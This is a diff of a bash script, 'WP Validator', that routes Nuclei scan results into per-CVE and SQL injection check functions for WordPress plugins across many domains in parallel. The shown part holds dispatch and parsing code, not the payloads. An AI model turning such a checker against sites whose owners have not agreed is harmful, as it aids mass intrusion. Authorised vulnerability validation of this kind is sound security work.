+        *CVE-2022-2593*) _check_cve_2022_2593 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-29410*) _check_cve_2022_29410 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-3141*) _check_cve_2022_3141 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-3494*) _check_cve_2022_3494 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-3720*) _check_cve_2022_3720 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-4351*) _check_cve_2022_4351 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-4359*) _check_cve_2022_4359 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-4370*) _check_cve_2022_4370 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-45373*) _check_cve_2022_45373 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-4546*) _check_cve_2022_4546 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-45820*) _check_cve_2022_45820 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-47426*) _check_cve_2022_47426 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-0262*) _check_cve_2023_0262 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-0277*) _check_cve_2023_0277 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-0487*) _check_cve_2023_0487 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-26325*) _check_cve_2023_26325 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-28659*) _check_cve_2023_28659 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-29432*) _check_cve_2023_29432 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-3416*) _check_cve_2023_3416 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-34179*) _check_cve_2023_34179 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-3435*) _check_cve_2023_3435 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-34383*) _check_cve_2023_34383 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-35879*) _check_cve_2023_35879 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-40010*) _check_cve_2023_40010 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-45657*) _check_cve_2023_45657 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-49752*) _check_cve_2023_49752 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-50851*) _check_cve_2023_50851 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-50853*) _check_cve_2023_50853 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-50855*) _check_cve_2023_50855 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-5108*) _check_cve_2023_5108 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2023-52135*) _check_cve_2023_52135 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-0709*) _check_cve_2024_0709 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-0956*) _check_cve_2024_0956 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-10499*) _check_cve_2024_10499 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-10570*) _check_cve_2024_10570 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-10862*) _check_cve_2024_10862 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-11912*) _check_cve_2024_11912 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-1207*) _check_cve_2024_1207 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-12157*) _check_cve_2024_12157 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-13184*) _check_cve_2024_13184 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-13475*) _check_cve_2024_13475 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-13479*) _check_cve_2024_13479 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-13481*) _check_cve_2024_13481 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-13483*) _check_cve_2024_13483 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-13712*) _check_cve_2024_13712 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-1990*) _check_cve_2024_1990 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-2386*) _check_cve_2024_2386 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-30242*) _check_cve_2024_30242 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-31356*) _check_cve_2024_31356 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-32134*) _check_cve_2024_32134 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-33559*) _check_cve_2024_33559 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-3820*) _check_cve_2024_3820 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-38708*) _check_cve_2024_38708 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-4145*) _check_cve_2024_4145 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-49621*) _check_cve_2024_49621 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-49655*) _check_cve_2024_49655 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-54280*) _check_cve_2024_54280 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2024-56039*) _check_cve_2024_56039 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-12166*) _check_cve_2025_12166 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-13126*) _check_cve_2025_13126 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-2317*) _check_cve_2025_2317 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-23993*) _check_cve_2025_23993 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-24759*) _check_cve_2025_24759 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-26943*) _check_cve_2025_26943 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-31056*) _check_cve_2025_31056 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-31534*) _check_cve_2025_31534 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-31553*) _check_cve_2025_31553 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-31599*) _check_cve_2025_31599 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-32547*) _check_cve_2025_32547 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-52773*) _check_cve_2025_52773 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-52829*) _check_cve_2025_52829 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-52830*) _check_cve_2025_52830 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-69338*) _check_cve_2025_69338 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-69366*) _check_cve_2025_69366 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-9200*) _check_cve_2025_9200 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2025-9807*) _check_cve_2025_9807 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2026-22484*) _check_cve_2026_22484 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2026-2416*) _check_cve_2026_2416 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2026-24959*) _check_cve_2026_24959 "$BASE_URL" "$DOMAIN" ;;
+        *leaguemanager-sqli*) _check_leaguemanager_sqli "$BASE_URL" "$DOMAIN" ;;
+        *mapsvg-sqli*) _check_mapsvg_sqli "$BASE_URL" "$DOMAIN" ;;
+        *q-and-a-plugin-sqli*) _check_q_and_a_plugin_sqli "$BASE_URL" "$DOMAIN" ;;
+        *rsvpmaker-sqli*) _check_rsvpmaker_sqli "$BASE_URL" "$DOMAIN" ;;
+        *wp-advanced-search-sqli*) _check_wp_advanced_search_sqli "$BASE_URL" "$DOMAIN" ;;
+        *zero-spam-sqli*) _check_zero_spam_sqli "$BASE_URL" "$DOMAIN" ;;
             *) echo -e "${RED}  Unknown: ${CVE_HINT}${NC}" ;;
         esac
     else
@@ -895,26 +1220,26 @@ if [ "${#POSITIONAL[@]}" -eq 0 ]; then
     echo "  --csv     Write results.csv"
     echo "  -j N      Parallel jobs (default: 1, suggest: 20)"
     echo ""
-    echo "Checks: 194 CVEs | 180 SQLi | 7 AuthBypass | 7 PrivEsc"
+    echo "Checks: 292 templates | 194 CVEs + 98 version-check | 7 AuthBypass | 7 PrivEsc"
     exit 1
 fi
 
 echo -e "${BOLD}${CYAN}====================================${NC}"
-echo -e "${BOLD}  WP Validator — 194 CVEs${NC}"
+echo -e "${BOLD}  WP Validator — 292 templates (194 CVE + 98 version-check)${NC}"
 echo -e "${BOLD}  Output: ${OUTDIR}${NC}"
 echo -e "${BOLD}  Jobs: ${JOBS}${NC}"
 [ "$CSV_MODE" -eq 1 ] && echo -e "${BOLD}  CSV → ${CSV_FILE}${NC}"
 echo -e "${CYAN}====================================${NC}"
 
-# Process a list of DOMAIN|CVE pairs (one per line) with up to $JOBS parallel workers
+# Process a list of DOMAIN|CVE|NUCLEI_URL triples (one per line) with up to $JOBS parallel workers
 process_pairs() {
     local PAIRS_FILE="$1"
     local TOTAL; TOTAL=$(wc -l < "$PAIRS_FILE" | tr -d ' ')
     local DONE=0 ACTIVE=0
     touch "$RESULTS_FILE" "$SQLMAP_FILE" "$VULN_FILE"
-    while IFS='|' read -r D C; do
+    while IFS='|' read -r D C U; do
         [ -z "$D" ] || [ -z "$C" ] && continue
-        validate_domain "$D" "$C" &
+        validate_domain "$D" "$C" "${U:-}" &
         ACTIVE=$((ACTIVE+1))
         DONE=$((DONE+1))
         printf "\r${CYAN}  [%d/%d] jobs=%d${NC}  " "$DONE" "$TOTAL" "$ACTIVE" >&2
@@ -932,15 +1257,18 @@ TOTAL_PAIRS=0
 INPUT="${POSITIONAL[0]}"
 if [ -f "$INPUT" ]; then
     if grep -qP '^\[' "$INPUT"; then
-        echo -e "${YELLOW}Nuclei output — dedup + routing by template ID${NC}"
-        # Pre-deduplicate all pairs
+        echo -e "${YELLOW}Nuclei output — dedup + routing by template ID (with URL replay)${NC}"
+        # Build DOMAIN|CVE|NUCLEI_URL triples using pure bash regex (no subshells per line)
         while IFS= read -r line; do
-            TMPL_ID=$(echo "$line"|grep -oP '^\[([^\]]+)\]'|tr -d '[]')
-            URL=$(echo "$line"|grep -oP 'https?://[^\s]+')
-            DOMAIN=$(echo "$URL"|grep -oP 'https?://[^/\s]+')
+            [[ "$line" =~ ^\[([^]]+)\] ]] || continue
+            TMPL_ID="${BASH_REMATCH[1]}"
+            [[ "$line" =~ (https?://[^[:space:]]+) ]] || continue
+            FULL_URL="${BASH_REMATCH[1]}"
+            [[ "$FULL_URL" =~ ^(https?://[^/?#]+) ]] || continue
+            DOMAIN="${BASH_REMATCH[1]}"
             [ -z "$TMPL_ID" ] || [ -z "$DOMAIN" ] && continue
-            echo "${DOMAIN}|${TMPL_ID}"
-        done < "$INPUT" | sort -u > "$PAIRS_TMP"
+            echo "${DOMAIN}|${TMPL_ID}|${FULL_URL}"
+        done < "$INPUT" | awk -F'|' '!seen[$1"|"$2]++' > "$PAIRS_TMP"
         TOTAL_PAIRS=$(wc -l < "$PAIRS_TMP" | tr -d ' ')
         echo -e "${YELLOW}  ${TOTAL_PAIRS} unique domain+CVE pairs (jobs=${JOBS})${NC}"
         process_pairs "$PAIRS_TMP"
